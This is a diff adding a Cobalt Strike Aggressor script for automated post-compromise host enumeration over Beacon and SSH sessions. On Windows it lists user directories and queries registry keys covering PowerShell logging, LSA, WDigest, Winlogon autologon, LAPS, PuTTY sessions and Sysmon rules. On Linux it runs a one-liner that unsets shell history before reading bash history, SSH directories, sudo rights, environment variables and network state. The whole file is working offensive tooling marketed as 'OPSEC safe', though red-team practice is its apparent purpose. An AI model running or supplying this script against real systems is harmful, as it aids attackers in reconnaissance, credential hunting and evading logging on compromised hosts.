@@ -1,0 +1,191 @@
+# Aggressor automated Windows Host Profiling using Beacon's built-in commands
+# @andrewchiles
+# https://github.com/threatexpress/red-team-scripts
+# References:
+# https://gist.github.com/HarmJ0y/fe676e3ceba74f22a28bd1b121182db7
+# https://github.com/leechristensen/Random/blob/master/PowerShellScripts/Get-HostProfile.ps1:
+# https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1
+# Load enumerate.cna into Cobalt Strike and issue the `enumerate` command on a Beacon or SSH session
+
+sub enumerate_windows {
+    $username = beacon_info($1,"user");
+    
+    bpwd($1);
+    bdrives($1);
+    bps($1);
+
+    # Local File Locations
+    bls($1,"C:\\");
+    bls($1,"C:\\Program Files");
+    bls($1,"C:\\Program Files \(x86\)");
+    bls($1,"C:\\ProgramData");
+    bls($1,"C:\\Users\\".$username."\\Documents");
+    bls($1,"C:\\Users\\".$username."\\Desktop");
+    bls($1,"C:\\Users\\".$username."\\Downloads");
+    bls($1,"C:\\Users\\".$username."\\AppData\\Roaming");
+    bls($1,"C:\\Users\\".$username."\\AppData\\Local");
+    bls($1,"C:\\Users\\".$username."\\AppData\\Roaming\\Microsoft\\Windows\\Recent");
+    
+    # .NET CLR Installed Versions
+    bls($1,"C:\\Windows\\Microsoft.Net\\Framework");
+    
+    # .NET CLR 2.0 installed
+    #bls($1,"C:\\Windows\\Microsoft.Net\\Framework\\v2.0.50727");
+
+    # .NET CLR 4.0 installed
+    #bls($1,"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319");
+
+    # Potential Mapped Drives
+    bls($1,"E:\\");
+    bls($1,"F:\\");
+    bls($1,"G:\\");
+    bls($1,"Z:\\");
+
+    # Operating System
+    breg_queryv($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "x64");
+    breg_queryv($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion", "CurrentVersion", "x64");
+    breg_queryv($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion", "CurrentBuild", "x64");
+    breg_queryv($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion", "RegisteredOrganization", "x64");
+    breg_queryv($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion", "RegisteredOwner", "x64");
+
+    # System Hardware/BIOS
+    breg_query($1, "HKLM\\HARDWARE\\DESCRIPTION\\System", "x64");
+    breg_query($1, "HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS", "x64");
+
+    # System Policies
+    breg_query($1, "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies", "x64");
+    breg_query($1, "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "x64");
+    breg_query($1, "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit", "x64");
+    breg_query($1, "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "x64");
+
+    # Powershell Version 2
+    breg_query($1, "HKLM\\Software\\Microsoft\\PowerShell\\1\\PowerShellEngine", "x64");
+    
+    # Powershell Version 5
+    breg_query($1, "HKLM\\Software\\Microsoft\\PowerShell\\3\\PowerShellEngine", "x64");
+    
+    # Powershell Logging
+    breg_query($1, "HKLM\\Software\\Policies\\Microsoft\\Windows\\Powershell", "x64");
+    breg_query($1, "HKLM\\Software\\Policies\\Microsoft\\Windows\\Powershell\\Transcription", "x64");
+    breg_query($1, "HKLM\\Software\\Policies\\Microsoft\\Windows\\Powershell\\ScriptBlockLogging", "x64");
+    breg_query($1, "HKLM\\Software\\Policies\\Microsoft\\Windows\\Powershell\\ModuleLogging", "x64");
+
+    # Recently Typed Commands and URLS
+    breg_query($1, "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", "x64");
+    breg_query($1, "HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs", "x64");
+
+    # Installed Software
+    breg_query($1, "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall", "x86");
+    breg_query($1, "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall", "x64");
+
+    # Installed Services
+    breg_query($1, "HKLM\\SYSTEM\\CurrentControlSet\\Services","x64");
+
+    # Mapped Drives
+    breg_query($1, "HKCU\\Network", "x64");
+    breg_query($1, "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2", "x64");
+
+    # Environment Variables
+
+    breg_query($1, "HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\Environment", "x64");
+    breg_query($1, "HKCU\\Environment", "x64");
+
+    # Internet Explorer Proxy Settings
+    breg_query($1,"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings");
+    breg_query($1,"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings");
+    breg_query($1,"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections");
+
+    # Firewall Profiles
+    breg_query($1,"HKLM\\System\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile", "x64");
+    breg_query($1,"HKLM\\System\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", "x64");
+    breg_query($1,"HKLM\\System\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile", "x64");
+   
+
+    # LSA Settings
+    breg_query($1, "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa", "x64");
+    breg_query($1, "HKLM\\System\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "x64");
+
+    # Secure Boot
+    breg_query($1, "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State", "x64");
+
+    # LAPS Admin Password Management
+    breg_query($1, "HKLM\\Software\\Policies\\Microsoft Services\\AdmPwd", "x64");
+    
+    # Windows Installer
+    breg_query($1, "HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer", "x64");
+    breg_query($1, "HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer", "x64");
+
+    # Event Log Forwarding
+    breg_query($1, "HKLM\\Software\\Policies\\Microsoft\\Windows\\EventLog\\EventForwarding\\SubscriptionManager", "x64");
+
+    # Winlogon (AutoLogon, AutoLogin, ScreenSaverGrace)
+    breg_query($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "x64");
+
+    # Windows Update
+    breg_query($1, "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate", "x64");
+    breg_query($1, "HKLM\\SOFTWARE\\Microsoft\\CCMSetup", "x64");
+    breg_query($1, "HKLM\\SOFTWARE\\Microsoft\\SMS\\Mobile Client", "x64");
+
+    # LANMAN
+    breg_query($1, "HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters", "x64");
+    breg_query($1, "HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\DefaultSecurity", "x64");
+
+    # Wdigest
+    breg_query($1, "HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", "x64");
+    
+    # Kerberos
+    breg_query($1, "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Kerberos\\Parameters", "x64");
+    
+    # Service Group Order
+    breg_query($1, "HKLM\\SYSTEM\\CurrentControlSet\\Control\\ServiceGroupOrder\\Security", "x64");
+
+    # Software Specific
+    # Putty
+    breg_query($1, "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions", "x64");
+    breg_query($1, "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions", "x86");
+
+    # Sysmon
+    breg_query($1, "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SysmonDrv\\Parameters", "x64");
+    breg_queryv($1, "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SysmonDrv\\Parameters", "Rules", "x64");
+
+}
+
+sub enumerate_linux {
+    # Bash one-liner for host enumeration
+    local('$commands');
+    local('$encoded');
+
+    $commands = "unset HISTFILE HISTFILESIZE HISTSIZE;hostname;w;uname -a;date;date -u;cat /etc/*-release;env;lastlog 2>/dev/null;ls -al /home ~ ~/.ssh /tmp /dev/shm;df -h;mount;sudo -l;cat ~/.bash_history ~/.known_hosts /etc/hosts /etc/resolv.conf;ifconfig -a; ps aux; netstat -pantl";
+
+    #$encoded = "echo " . base64_encode($commands) . "|base64 -d|bash";
+    #bpinut($1, "\c0Executing the following commands: " . $commands);
+    #bshell($1, $encoded);
+
+    bshell($1, $commands);
+    
+}
+
+beacon_command_register(
+    "enumerate", 
+    "Perform OPSEC safe host enumeration with built-in commands", 
+    "Use: enumerate\n\nPerform Windows host enumeration with OPSEC safe techniques.");
+
+alias enumerate {
+    btask($1, "\c0Performing Windows host enumeration! (OPSEC Safe)", "T1082");
+    enumerate_windows($1);
+
+}
+
+##############
+# SSH Alias
+##############
+
+ssh_command_register(
+    "enumerate", 
+    "Perform OPSEC safe host enumeration with built-in commands", 
+    "Use: enumerate\n\nPerform Linux host enumeration with OPSEC safe techniques.");
+
+ssh_alias enumerate {
+    btask($1, "\c0Performing Linux host enumeration! (OPSEC Safe)", "T1082");
+    enumerate_linux($1);
+}
